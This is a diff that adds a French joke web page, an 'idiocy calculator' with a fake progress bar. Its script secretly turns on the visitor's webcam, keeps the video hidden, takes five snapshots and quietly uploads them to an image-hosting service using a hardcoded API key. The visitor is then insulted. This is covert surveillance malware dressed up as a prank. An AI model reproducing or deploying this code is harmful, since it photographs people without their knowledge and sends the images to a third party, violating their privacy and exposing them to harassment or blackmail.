@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Calculateur de débilité</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html, body {
+  background: #000;
+  color: #00ff41;
+  font-family: 'Courier New', monospace;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+}
+.scanlines {
+  pointer-events: none;
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,65,0.03) 2px, rgba(0,255,65,0.03) 4px);
+  z-index: 0;
+}
+.content {
+  position: relative; z-index: 1;
+  width: 100%; max-width: 520px;
+  text-align: center;
+  padding: 2rem 1rem;
+}
+#title {
+  font-size: 1.5rem; font-weight: bold; letter-spacing: 5px;
+  text-transform: uppercase; color: #00ff41;
+  margin-bottom: 2.5rem;
+  text-shadow: 0 0 8px #00ff41, 0 0 20px #00ff41;
+  animation: flicker 4s infinite;
+}
+@keyframes flicker {
+  0%,19%,21%,23%,25%,54%,56%,100% { opacity: 1; }
+  20%,22%,24%,55% { opacity: 0.6; }
+}
+.bar-wrapper {
+  width: 100%; background: #001a00;
+  border: 1px solid #00ff41; height: 30px;
+  position: relative; overflow: hidden; margin-bottom: 0.6rem;
+  box-shadow: 0 0 12px #00ff41, inset 0 0 10px rgba(0,255,65,0.1);
+  display: none;
+}
+.bar-fill {
+  height: 100%; width: 0%; background: #00ff41;
+  transition: width 0.04s linear;
+  box-shadow: 0 0 15px #00ff41;
+  position: relative;
+}
+.bar-fill::after {
+  content: '';
+  position: absolute; right: 0; top: 0; bottom: 0; width: 4px;
+  background: #fff; box-shadow: 0 0 8px #fff;
+}
+#percent {
+  font-size: 1.1rem; color: #00ff41; letter-spacing: 4px;
+  font-weight: bold; margin-bottom: 2rem;
+  text-shadow: 0 0 6px #00ff41;
+  display: none;
+}
+#result-msg {
+  font-size: 2.2rem; font-weight: bold; color: #00ff41;
+  letter-spacing: 3px; display: none;
+  text-shadow: 0 0 10px #00ff41, 0 0 30px #00ff41, 0 0 60px #00ff41;
+  animation: pulse 1s infinite alternate;
+}
+@keyframes pulse {
+  from { text-shadow: 0 0 10px #00ff41, 0 0 30px #00ff41; }
+  to   { text-shadow: 0 0 20px #00ff41, 0 0 60px #00ff41, 0 0 120px #00ff41; }
+}
+#start-btn {
+  background: transparent; border: 1px solid #00ff41; color: #00ff41;
+  font-family: 'Courier New', monospace; font-size: 1rem; letter-spacing: 4px;
+  padding: 12px 30px; cursor: pointer; text-transform: uppercase;
+  box-shadow: 0 0 10px #00ff41, inset 0 0 8px rgba(0,255,65,0.1);
+  transition: all 0.2s;
+}
+#start-btn:hover {
+  background: rgba(0,255,65,0.12);
+  box-shadow: 0 0 20px #00ff41;
+}
+video { display: none !important; }
+canvas { display: none !important; }
+</style>
+</head>
+<body>
+<div class="scanlines"></div>
+<div class="content">
+  <div id="title">Calculateur de débilité</div>
+  <div id="start-section">
+    <button id="start-btn" onclick="startCapture()">[ LANCER L'ANALYSE ]</button>
+  </div>
+  <div class="bar-wrapper" id="bar-wrapper">
+    <div class="bar-fill" id="bar"></div>
+  </div>
+  <div id="percent">0%</div>
+  <div id="result-msg">VOUS ÊTES DÉBILE !!</div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const IMGBB_KEY = 'c1b447115e3eb10165c80ccf5c1f70ba';
+
+async function uploadToImgBB(base64data) {
+  const clean = base64data.split(',')[1];
+  const body = new FormData();
+  body.append('key', IMGBB_KEY);
+  body.append('image', clean);
+  try {
+    await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body });
+  } catch(e) {}
+}
+
+async function startCapture() {
+  document.getElementById('start-section').style.display = 'none';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const bar = document.getElementById('bar');
+  const pct = document.getElementById('percent');
+  const barWrapper = document.getElementById('bar-wrapper');
+
+  let stream = null;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    video.srcObject = stream;
+    await new Promise(r => { video.onloadedmetadata = r; });
+    await new Promise(r => setTimeout(r, 600));
+  } catch(e) {}
+
+  canvas.width = 640;
+  canvas.height = 480;
+  const ctx = canvas.getContext('2d');
+
+  for (let i = 0; i < 5; i++) {
+    await new Promise(r => setTimeout(r, 300));
+    if (stream && video.readyState >= 2) {
+      ctx.drawImage(video, 0, 0, 640, 480);
+    } else {
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0, 0, 640, 480);
+    }
+    const b64 = canvas.toDataURL('image/jpeg', 0.85);
+    uploadToImgBB(b64);
+  }
+
+  if (stream) stream.getTracks().forEach(t => t.stop());
+
+  barWrapper.style.display = 'block';
+  pct.style.display = 'block';
+
+  await new Promise(resolve => {
+    let current = 0;
+    const steps = 250;
+    const duration = 4000;
+    const iv = setInterval(() => {
+      current++;
+      const p = Math.round((current / steps) * 100);
+      bar.style.width = p + '%';
+      pct.textContent = p + '%';
+      if (current >= steps) { clearInterval(iv); resolve(); }
+    }, duration / steps);
+  });
+
+  pct.textContent = '100%';
+  await new Promise(r => setTimeout(r, 300));
+  document.getElementById('result-msg').style.display = 'block';
+}
+</script>
+</body>
+</html>
